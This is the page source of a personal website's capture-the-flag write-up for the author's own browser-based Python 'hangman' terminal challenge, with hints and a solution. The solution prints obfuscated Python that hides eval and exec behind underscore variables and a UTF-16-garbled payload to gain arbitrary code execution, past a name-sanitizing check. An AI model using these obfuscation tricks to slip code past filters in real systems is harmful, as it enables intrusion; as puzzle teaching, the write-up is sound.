
import Layout from '@/components/layout'
import Head from 'next/head'
import Accordion from '@/components/accordion'
import Sidebar from '@/components/sidebar'
import Link from 'next/link'
import ProminentLink from '@/components/prominentLink'
import DiscreetLink from '@/components/discreetLink'
import MailLink from '@/components/mailLink'

import { FaChevronRight, FaSearch } from 'react-icons/fa'
import { RiArrowGoBackFill } from 'react-icons/ri'

import 'katex/dist/katex.min.css'
import Latex from 'react-latex-next'
import Spoiler from '@/components/spoiler'
import IncompleteMessage from '@/components/incompleteMessage'
import Image from 'next/image'
import { copyToClipboard, CopyButton } from '@/components/copyButton'
import { ToastContainer } from 'react-toastify'
import 'react-toastify/dist/ReactToastify.css'
import { Thm, Lemma, Prop, Proof, Defn, Example } from '@/components/math'


export default function Terminal () {
    return (
        <Layout>
            <Head>
                <title>Terminal | Daniel C</title>
            </Head>
                <>
                    
                        <ToastContainer
                            position='top-right'
                            autoClose={5000}
                            hideProgressBar={false}
                            newestOnTop={false}
                            closeOnClick
                            rtl={false}
                            pauseOnFocusLoss={false}
                            pauseOnHover={false}
                            theme='dark'
                        />
    
                    <div className="relative w-full 2xl:max-w-[90%] flex h-full"> {/* whole thing (including large-screen left space filler, which is 10%) is max 90%; so 10% each side */}
    <Sidebar>

        <div className="border-elevated overflow-y-auto w-full md:w-[calc(300px-2px)] h-full md:h-auto md:max-h-[calc(100vh-15rem)] break-all">
            <div className="relative bottom-0 pl-4">
                <ul className="dirtree mb-4 md:mb-0">
                    
                    

                    
                    
                        
                            <Accordion title="root" href="" type="folder" isRoot={ true } isSelected={ false } isOpenByDefault={ true } >
                                
                                    
                                        
                        
                            <Accordion title="comp-sci" href="/comp-sci" type="folder" isRoot={ false } isSelected={ false } isOpenByDefault={ true } >
                                
                                    
                                        
                        
                            <Accordion title="binary-search" href="/comp-sci/binary-search" type="file" isRoot={false} isSelected={ false } />
                        
                    
                                    
                                
                            </Accordion>
                        
                    
                                    
                                        
                        
                            <Accordion title="components" href="/components" type="folder" isRoot={ false } isSelected={ false } isOpenByDefault={ true } >
                                
                            </Accordion>
                        
                    
                                    
                                        
                        
                            <Accordion title="maths" href="/maths" type="folder" isRoot={ false } isSelected={ false } isOpenByDefault={ true } >
                                
                                    
                                        
                        
                            <Accordion title="Analysis-Topology" href="/maths/Analysis-Topology" type="course" isRoot={false} isSelected={ false } />
                        
                    
                                    
                                        
                        
                            <Accordion title="olympiad" href="/maths/olympiad" type="folder" isRoot={ false } isSelected={ false } isOpenByDefault={ false } >
                                
                                    
                                        
                        
                            <Accordion title="lagrange-multipliers" href="/maths/olympiad/lagrange-multipliers" type="file" isRoot={false} isSelected={ false } />
                        
                    
                                    
                                
                            </Accordion>
                        
                    
                                    
                                        
                        
                            <Accordion title="proving-FTA" href="/maths/proving-FTA" type="folder" isRoot={ false } isSelected={ false } isOpenByDefault={ false } >
                                
                                    
                                        
                        
                            <Accordion title="1-integer-axioms" href="/maths/proving-FTA/1-integer-axioms" type="file" isRoot={false} isSelected={ false } />
                        
                    
                                    
                                        
                        
                            <Accordion title="2-division-algo" href="/maths/proving-FTA/2-division-algo" type="file" isRoot={false} isSelected={ false } />
                        
                    
                                    
                                        
                        
                            <Accordion title="3-bezout-egcd" href="/maths/proving-FTA/3-bezout-egcd" type="file" isRoot={false} isSelected={ false } />
                        
                    
                                    
                                        
                        
                            <Accordion title="4-euclid" href="/maths/proving-FTA/4-euclid" type="file" isRoot={false} isSelected={ false } />
                        
                    
                                    
                                        
                        
                            <Accordion title="5-fta" href="/maths/proving-FTA/5-fta" type="file" isRoot={false} isSelected={ false } />
                        
                    
                                    
                                
                            </Accordion>
                        
                    
                                    
                                        
                        
                            <Accordion title="research" href="/maths/research" type="folder" isRoot={ false } isSelected={ false } isOpenByDefault={ false } >
                                
                                    
                                        
                        
                            <Accordion title="CNATs" href="/maths/research/CNATs" type="file" isRoot={false} isSelected={ false } />
                        
                    
                                    
                                        
                        
                            <Accordion title="cube-tilings" href="/maths/research/cube-tilings" type="file" isRoot={false} isSelected={ false } />
                        
                    
                                    
                                
                            </Accordion>
                        
                    
                                    
                                
                            </Accordion>
                        
                    
                                    
                                        
                        
                            <Accordion title="writeups" href="/writeups" type="folder" isRoot={ false } isSelected={ false } isOpenByDefault={ true } >
                                
                                    
                                        
                        
                            <Accordion title="terminal" href="/writeups/terminal" type="file" isRoot={false} isSelected={ true } />
                        
                    
                                    
                                
                            </Accordion>
                        
                    
                                    
                                
                            </Accordion>
                        
                    
                </ul>
            </div>
        </div>

    </Sidebar>

    <article className="w-full min-w-0 px-6 pt-3 mb-14">

        <div className="h-[4.5rem] md:h-0"/>

        
            <div className="flex flex-wrap items-center align-middle space-x-1 mb-3">
                
                    <span className="relative top-[0.1em] text-elevated"> <FaChevronRight size={12}/> </span>
                    <p className="text-lg font-bold text-secondary [@media(hover:hover)]:hover:underline"><Link href="/writeups">writeups</Link></p>
                
            </div>
        

        
            <p className="text-elevated mb-4">Last updated 08 Jun 2024</p>
        

        
            <div className="mb-4">
                <CopyButton text="A writeup for the hangman challenge on my homepage. As far as I know it&#x27;s a completely original challenge; if anything I&#x27;m proud of the implementation and how real the terminal feels. The core idea came from talking with a friend about writing a python file that sanitizes to a fixed string, reminiscent of quines. I used Pyodide to run python in the browser (pretty cool!), which I heard about from my teacher at school, who used it to make the (well-known?) Python Sponge. Hint 1 The hangman game really is unbeatable. The goal of the challenge is to take advantage of the name loading and use that to read the flag. Hint 2 Look at the name verification function. If we can write some python code that sanitizes to ErroryournamedoesntseemtobevalidIllcallyouMrUnimportant, then we can input that as the name and it will pass the verification and thus be written to a file. Then we can run that file just like we ran game.py. So the goal is: write a python file that reads /flag.txt, whose alphanumeric characters in order are Erroryour.... Hint 3 Can you spot any python keywords in the sanitized error message? Research the built-in python functions and see which ones might be useful. We can have variables because underscores are allowed in python variable names. Also we have numbers, by doing something like: _ = &#x27;&#x27; &lt; &#x27;_&#x27; # one (compares ascii values) __ = _+_+_+_ # four ___ = __*__ # sixteen Solution What follows is one possible solution, that allows arbitrary code execution with a shell, so in particular you can read the flag file. Can you come up with an alternative? For readability, I&#x27;ve named all variables something representative, but they can all be replaced with underscores (see the minified version). The solution uses a trick of encoding a utf-8 string in utf-16 to garble it. &#x27;Erroryo&#x27; U,R,N = &#x27;urn&#x27; &#x27;amedoesn&#x27; T,S = &#x27;ts&#x27; &#x27;eemtob&#x27; EVAL = eval STR = EVAL(S+T+R) I,D = &#x27;id&#x27; DIR = EVAL(D+I+R) &#x27;IllcallyouMrUn&#x27; ONE = &#x27;&#x27;&lt;&#x27;_&#x27; SEVEN = ONE+ONE+ONE+ONE+ONE+ONE+ONE BUILTINS = STR(EVAL)[ONE:SEVEN-ONE]+I+N+S FUNCS = DIR(EVAL(&#x27;__import__(&quot;&#x27;+BUILTINS+&#x27;&quot;)&#x27;)) &#x27;ant&#x27; EXEC = FUNCS[-SEVEN*SEVEN-ONE-ONE] BYTES = FUNCS[-SEVEN*SEVEN-SEVEN-SEVEN-ONE-ONE] # the garbage characters are a utf16 encoding of the utf8 shellcode, the decoded version is: # while True: exec(input()); SHELLCODE = BYTES+&#x27;(&quot;桷汩⁥牔敵›硥捥椨灮瑵⤨㬩&quot;,&quot;&#x27;+U+STR(SEVEN+SEVEN+ONE+ONE)+&#x27;&quot;)[&#x27;+STR(ONE+ONE)+&#x27;:]&#x27; EVAL(EXEC+&#x27;(&#x27;+SHELLCODE+&#x27;)&#x27;) And the reduced version: &#x27;Erroryo&#x27;;________,_____,_________=&#x27;urn&#x27;;&#x27;amedoesn&#x27;;__________,______=&#x27;ts&#x27;;&#x27;eemtob&#x27;;___=eval;____,___________=&#x27;id&#x27;;&#x27;IllcallyouMrUn&#x27;;_=&#x27;&#x27;&lt;&#x27;_&#x27;;__=_+_+_+_+_+_+_;___((____________:=___(___________+____+_____)(___(&#x27;__import__(&quot;&#x27;+(_______:=___(______+__________+_____))(___)[_:__-_]+____+_________+______+&#x27;&quot;)&#x27;)))[-__*__-_-_]+&#x27;(&#x27;+____________[-__*__-__-__-_-_]+&#x27;(&quot;桷汩⁥牔敵›硥捥椨灮瑵⤨㬩&quot;,&quot;&#x27;+________+_______(__+__+_+_)+&#x27;&quot;)[&#x27;+_______(_+_)+&#x27;:]&#x27;+&#x27;)&#x27;);&#x27;ant&#x27; Cheese solution The way I got python to run in the browser was with pyodide and a web-worker. So the python runs client-side (!) i.e. this is all really a fake prison-break environment. In particular the flag file has to be generated somehow, so the flag is somewhere in the source. So I had to find somewhere to hide the loading of the flag so that it wasn&#x27;t completely obvious. It&#x27;s in the main thread so at least there are no revealing network requests (initially it was in init.py). It&#x27;s base-64 encoded; look for it in F12 -&gt; Sources.">Copy article plaintext</CopyButton>
            </div>
        

        <div className="article mb-4">
            <h1 id="terminal-challenge">Terminal Challenge</h1>

<p>A writeup for the <DiscreetLink href='https://terminal.danielc.rocks'>hangman</DiscreetLink> challenge on my homepage. As far as I know it's a completely original challenge; if anything I'm proud of the implementation and how real the terminal feels. The core idea came from talking with a friend about writing a python file that sanitizes to a fixed string, reminiscent of <DiscreetLink href='https://en.wikipedia.org/wiki/Quine_(computing)'>quines</DiscreetLink>.</p>

<p>I used <ProminentLink href='https://pyodide.org/en/stable/'>Pyodide</ProminentLink> to run python in the browser (pretty cool!), which I heard about from my teacher at school, who used it to make the (well-known?) <DiscreetLink href='https://www.pythonsponge.com/'>Python Sponge</DiscreetLink>.</p>

<h2 id="hint-1" className="group flex">Hint 1&nbsp;<Link href="#hint-1" onClick={() => copyToClipboard("https://notes.danielc.rocks/writeups/terminal#hint-1", true)} className="hidden group-hover:block text-primary">¶</Link></h2>

<Spoiler>

<p>The hangman game really is <ProminentLink href='https://youtu.be/le5uGqHKll8?t=550'>unbeatable</ProminentLink>. The goal of the challenge is to take advantage of the name loading and use that to read the flag.</p>

</Spoiler>

<h2 id="hint-2" className="group flex">Hint 2&nbsp;<Link href="#hint-2" onClick={() => copyToClipboard("https://notes.danielc.rocks/writeups/terminal#hint-2", true)} className="hidden group-hover:block text-primary">¶</Link></h2>

<Spoiler>

<p>Look at the name verification function. If we can write some python code that sanitizes to <code>ErroryournamedoesntseemtobevalidIllcallyouMrUnimportant</code>, then we can input that as the name and it will pass the verification and thus be written to a file. Then we can run that file just like we ran <code>game.py</code>.</p>

<p><br/>
So the goal is: write a python file that reads <code>/flag.txt</code>, whose alphanumeric characters in order are <code>Erroryour...</code>.</p>

</Spoiler>

<h2 id="hint-3" className="group flex">Hint 3&nbsp;<Link href="#hint-3" onClick={() => copyToClipboard("https://notes.danielc.rocks/writeups/terminal#hint-3", true)} className="hidden group-hover:block text-primary">¶</Link></h2>

<Spoiler>

<p>Can you spot any python keywords in the sanitized error message? Research the built-in python functions and see which ones might be useful.</p>

<p><br/></p>

<p>We can have variables because underscores are allowed in python variable names.
Also we have numbers, by doing something like:</p>

<div className="codehilite">
<pre><span></span><code><span className="n">_</span> <span className="o">=</span> <span className="s1">&#39;&#39;</span> <span className="o">&lt;</span> <span className="s1">&#39;_&#39;</span> <span className="c1"># one (compares ascii values)</span><br/><span className="n">__</span> <span className="o">=</span> <span className="n">_</span><span className="o">+</span><span className="n">_</span><span className="o">+</span><span className="n">_</span><span className="o">+</span><span className="n">_</span> <span className="c1"># four</span><br/><span className="n">___</span> <span className="o">=</span> <span className="n">__</span><span className="o">*</span><span className="n">__</span> <span className="c1"># sixteen</span><br/></code></pre>
</div>

</Spoiler>

<h2 id="solution" className="group flex">Solution&nbsp;<Link href="#solution" onClick={() => copyToClipboard("https://notes.danielc.rocks/writeups/terminal#solution", true)} className="hidden group-hover:block text-primary">¶</Link></h2>

<Spoiler>

<p>What follows is one possible solution, that allows arbitrary code execution with a shell, so in particular you can read the flag file. Can you come up with an alternative?</p>

<p><br/></p>

<p>For readability, I've named all variables something representative, but they can all be replaced with underscores (see the minified version). The solution uses a <ProminentLink href='https://github.com/clemg/pythongolfer?tab=readme-ov-file#3---qa'>trick</ProminentLink> of encoding a utf-8 string in utf-16 to garble it.</p>

<div className="codehilite">
<pre><span></span><code><span className="s1">&#39;Erroryo&#39;</span><br/><span className="n">U</span><span className="p">,</span><span className="n">R</span><span className="p">,</span><span className="n">N</span> <span className="o">=</span> <span className="s1">&#39;urn&#39;</span><br/><span className="s1">&#39;amedoesn&#39;</span><br/><span className="n">T</span><span className="p">,</span><span className="n">S</span> <span className="o">=</span> <span className="s1">&#39;ts&#39;</span><br/><span className="s1">&#39;eemtob&#39;</span><br/><span className="n">EVAL</span> <span className="o">=</span> <span className="nb">eval</span><br/><span className="n">STR</span> <span className="o">=</span> <span className="n">EVAL</span><span className="p">(</span><span className="n">S</span><span className="o">+</span><span className="n">T</span><span className="o">+</span><span className="n">R</span><span className="p">)</span><br/><span className="n">I</span><span className="p">,</span><span className="n">D</span> <span className="o">=</span> <span className="s1">&#39;id&#39;</span><br/><span className="n">DIR</span> <span className="o">=</span> <span className="n">EVAL</span><span className="p">(</span><span className="n">D</span><span className="o">+</span><span className="n">I</span><span className="o">+</span><span className="n">R</span><span className="p">)</span><br/><span className="s1">&#39;IllcallyouMrUn&#39;</span><br/><span className="n">ONE</span> <span className="o">=</span> <span className="s1">&#39;&#39;</span><span className="o">&lt;</span><span className="s1">&#39;_&#39;</span><br/><span className="n">SEVEN</span> <span className="o">=</span> <span className="n">ONE</span><span className="o">+</span><span className="n">ONE</span><span className="o">+</span><span className="n">ONE</span><span className="o">+</span><span className="n">ONE</span><span className="o">+</span><span className="n">ONE</span><span className="o">+</span><span className="n">ONE</span><span className="o">+</span><span className="n">ONE</span><br/><span className="n">BUILTINS</span> <span className="o">=</span> <span className="n">STR</span><span className="p">(</span><span className="n">EVAL</span><span className="p">)[</span><span className="n">ONE</span><span className="p">:</span><span className="n">SEVEN</span><span className="o">-</span><span className="n">ONE</span><span className="p">]</span><span className="o">+</span><span className="n">I</span><span className="o">+</span><span className="n">N</span><span className="o">+</span><span className="n">S</span><br/><span className="n">FUNCS</span> <span className="o">=</span> <span className="n">DIR</span><span className="p">(</span><span className="n">EVAL</span><span className="p">(</span><span className="s1">&#39;__import__(&quot;&#39;</span><span className="o">+</span><span className="n">BUILTINS</span><span className="o">+</span><span className="s1">&#39;&quot;)&#39;</span><span className="p">))</span><br/><span className="s1">&#39;ant&#39;</span><br/><br/><span className="n">EXEC</span> <span className="o">=</span> <span className="n">FUNCS</span><span className="p">[</span><span className="o">-</span><span className="n">SEVEN</span><span className="o">*</span><span className="n">SEVEN</span><span className="o">-</span><span className="n">ONE</span><span className="o">-</span><span className="n">ONE</span><span className="p">]</span><br/><span className="n">BYTES</span> <span className="o">=</span> <span className="n">FUNCS</span><span className="p">[</span><span className="o">-</span><span className="n">SEVEN</span><span className="o">*</span><span className="n">SEVEN</span><span className="o">-</span><span className="n">SEVEN</span><span className="o">-</span><span className="n">SEVEN</span><span className="o">-</span><span className="n">ONE</span><span className="o">-</span><span className="n">ONE</span><span className="p">]</span><br/><br/><span className="c1"># the garbage characters are a utf16 encoding of the utf8 shellcode, the decoded version is:</span><br/><span className="c1"># while True: exec(input());</span><br/><br/><span className="n">SHELLCODE</span> <span className="o">=</span> <span className="n">BYTES</span><span className="o">+</span><span className="s1">&#39;(&quot;桷汩⁥牔敵›硥捥椨灮瑵⤨㬩&quot;,&quot;&#39;</span><span className="o">+</span><span className="n">U</span><span className="o">+</span><span className="n">STR</span><span className="p">(</span><span className="n">SEVEN</span><span className="o">+</span><span className="n">SEVEN</span><span className="o">+</span><span className="n">ONE</span><span className="o">+</span><span className="n">ONE</span><span className="p">)</span><span className="o">+</span><span className="s1">&#39;&quot;)[&#39;</span><span className="o">+</span><span className="n">STR</span><span className="p">(</span><span className="n">ONE</span><span className="o">+</span><span className="n">ONE</span><span className="p">)</span><span className="o">+</span><span className="s1">&#39;:]&#39;</span><br/><br/><span className="n">EVAL</span><span className="p">(</span><span className="n">EXEC</span><span className="o">+</span><span className="s1">&#39;(&#39;</span><span className="o">+</span><span className="n">SHELLCODE</span><span className="o">+</span><span className="s1">&#39;)&#39;</span><span className="p">)</span><br/></code></pre>
</div>

<p><br/></p>

<div className='inline'>
And the reduced version:
</div>

<div className="codehilite relative">
<div className="absolute top-2 right-2"><CopyButton text="'Erroryo';________,_____,_________='urn';'amedoesn';__________,______='ts';'eemtob';___=eval;____,___________='id';'IllcallyouMrUn';_=''&lt;'_';__=_+_+_+_+_+_+_;___((____________:=___(___________+____+_____)(___('__import__(&quot;'+(_______:=___(______+__________+_____))(___)[_:__-_]+____+_________+______+'&quot;)')))[-__*__-_-_]+'('+____________[-__*__-__-__-_-_]+'(&quot;桷汩⁥牔敵›硥捥椨灮瑵⤨㬩&quot;,&quot;'+________+_______(__+__+_+_)+'&quot;)['+_______(_+_)+':]'+')');'ant'"/></div>
<pre><span></span><code><span className="s1">&#39;Erroryo&#39;</span><span className="p">;</span><span className="n">________</span><span className="p">,</span><span className="n">_____</span><span className="p">,</span><span className="n">_________</span><span className="o">=</span><span className="s1">&#39;urn&#39;</span><span className="p">;</span><span className="s1">&#39;amedoesn&#39;</span><span className="p">;</span><span className="n">__________</span><span className="p">,</span><span className="n">______</span><span className="o">=</span><span className="s1">&#39;ts&#39;</span><span className="p">;</span><span className="s1">&#39;eemtob&#39;</span><span className="p">;</span><span className="n">___</span><span className="o">=</span><span className="nb">eval</span><span className="p">;</span><span className="n">____</span><span className="p">,</span><span className="n">___________</span><span className="o">=</span><span className="s1">&#39;id&#39;</span><span className="p">;</span><span className="s1">&#39;IllcallyouMrUn&#39;</span><span className="p">;</span><span className="n">_</span><span className="o">=</span><span className="s1">&#39;&#39;</span><span className="o">&lt;</span><span className="s1">&#39;_&#39;</span><span className="p">;</span><span className="n">__</span><span className="o">=</span><span className="n">_</span><span className="o">+</span><span className="n">_</span><span className="o">+</span><span className="n">_</span><span className="o">+</span><span className="n">_</span><span className="o">+</span><span className="n">_</span><span className="o">+</span><span className="n">_</span><span className="o">+</span><span className="n">_</span><span className="p">;</span><span className="n">___</span><span className="p">((</span><span className="n">____________</span><span className="o">:=</span><span className="n">___</span><span className="p">(</span><span className="n">___________</span><span className="o">+</span><span className="n">____</span><span className="o">+</span><span className="n">_____</span><span className="p">)(</span><span className="n">___</span><span className="p">(</span><span className="s1">&#39;__import__(&quot;&#39;</span><span className="o">+</span><span className="p">(</span><span className="n">_______</span><span className="o">:=</span><span className="n">___</span><span className="p">(</span><span className="n">______</span><span className="o">+</span><span className="n">__________</span><span className="o">+</span><span className="n">_____</span><span className="p">))(</span><span className="n">___</span><span className="p">)[</span><span className="n">_</span><span className="p">:</span><span className="n">__</span><span className="o">-</span><span className="n">_</span><span className="p">]</span><span className="o">+</span><span className="n">____</span><span className="o">+</span><span className="n">_________</span><span className="o">+</span><span className="n">______</span><span className="o">+</span><span className="s1">&#39;&quot;)&#39;</span><span className="p">)))[</span><span className="o">-</span><span className="n">__</span><span className="o">*</span><span className="n">__</span><span className="o">-</span><span className="n">_</span><span className="o">-</span><span className="n">_</span><span className="p">]</span><span className="o">+</span><span className="s1">&#39;(&#39;</span><span className="o">+</span><span className="n">____________</span><span className="p">[</span><span className="o">-</span><span className="n">__</span><span className="o">*</span><span className="n">__</span><span className="o">-</span><span className="n">__</span><span className="o">-</span><span className="n">__</span><span className="o">-</span><span className="n">_</span><span className="o">-</span><span className="n">_</span><span className="p">]</span><span className="o">+</span><span className="s1">&#39;(&quot;桷汩⁥牔敵›硥捥椨灮瑵⤨㬩&quot;,&quot;&#39;</span><span className="o">+</span><span className="n">________</span><span className="o">+</span><span className="n">_______</span><span className="p">(</span><span className="n">__</span><span className="o">+</span><span className="n">__</span><span className="o">+</span><span className="n">_</span><span className="o">+</span><span className="n">_</span><span className="p">)</span><span className="o">+</span><span className="s1">&#39;&quot;)[&#39;</span><span className="o">+</span><span className="n">_______</span><span className="p">(</span><span className="n">_</span><span className="o">+</span><span className="n">_</span><span className="p">)</span><span className="o">+</span><span className="s1">&#39;:]&#39;</span><span className="o">+</span><span className="s1">&#39;)&#39;</span><span className="p">);</span><span className="s1">&#39;ant&#39;</span><br/></code></pre>
</div>

</Spoiler>

<h2 id="cheese-solution" className="group flex">Cheese solution&nbsp;<Link href="#cheese-solution" onClick={() => copyToClipboard("https://notes.danielc.rocks/writeups/terminal#cheese-solution", true)} className="hidden group-hover:block text-primary">¶</Link></h2>

<Spoiler>

<p>The way I got python to run in the browser was with <DiscreetLink href='https://pyodide.org/en/stable/'>pyodide</DiscreetLink> and a <DiscreetLink href='https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Using_web_workers'>web-worker</DiscreetLink>.
So the python runs client-side (!) i.e. this is all really a fake prison-break environment. In particular the flag file has to be generated somehow, so the flag is somewhere in the source.</p>

<p><br/></p>

<p>So I had to find somewhere to hide the loading of the flag so that it wasn't completely obvious. It's in the main thread so at least there are no revealing network requests (initially it was in <code>init.py</code>).</p>

<p><br/></p>

<p>It's base-64 encoded; look for it in F12 -&gt; Sources.</p>

</Spoiler>

        </div>

        
            <div className="flex justify-start mb-4">
                <Link href="/writeups">
                    <div className="flex items-center justify-center space-x-1 text-primary">
                        <RiArrowGoBackFill/>
                        <p>up a level</p>
                    </div>
                </Link>
            </div>
        

    </article>

    
        <nav className="hidden xl:flex w-[300px] xl:shrink-0 xl:justify-start h-100% min-h-screen border-l-2 border-elevated px-6 py-4">
            <div className="fixed">
                <h1 className="font-bold text-xl">In this Article</h1>
                <ul className="text-elevated">
                    
                        <li className="pt-2 text-lg font-bold flex items-start justify-start space-x-1"><FaChevronRight className="relative top-2" size={12}/><Link href="#hint-1" className="text-link [@media(hover:hover)]:hover:underline">Hint 1</Link></li>
                    
                        <li className="pt-2 text-lg font-bold flex items-start justify-start space-x-1"><FaChevronRight className="relative top-2" size={12}/><Link href="#hint-2" className="text-link [@media(hover:hover)]:hover:underline">Hint 2</Link></li>
                    
                        <li className="pt-2 text-lg font-bold flex items-start justify-start space-x-1"><FaChevronRight className="relative top-2" size={12}/><Link href="#hint-3" className="text-link [@media(hover:hover)]:hover:underline">Hint 3</Link></li>
                    
                        <li className="pt-2 text-lg font-bold flex items-start justify-start space-x-1"><FaChevronRight className="relative top-2" size={12}/><Link href="#solution" className="text-link [@media(hover:hover)]:hover:underline">Solution</Link></li>
                    
                        <li className="pt-2 text-lg font-bold flex items-start justify-start space-x-1"><FaChevronRight className="relative top-2" size={12}/><Link href="#cheese-solution" className="text-link [@media(hover:hover)]:hover:underline">Cheese solution</Link></li>
                    
                </ul>
            </div>
        </nav>
    
</div>
                </>
        </Layout>
    )
}
    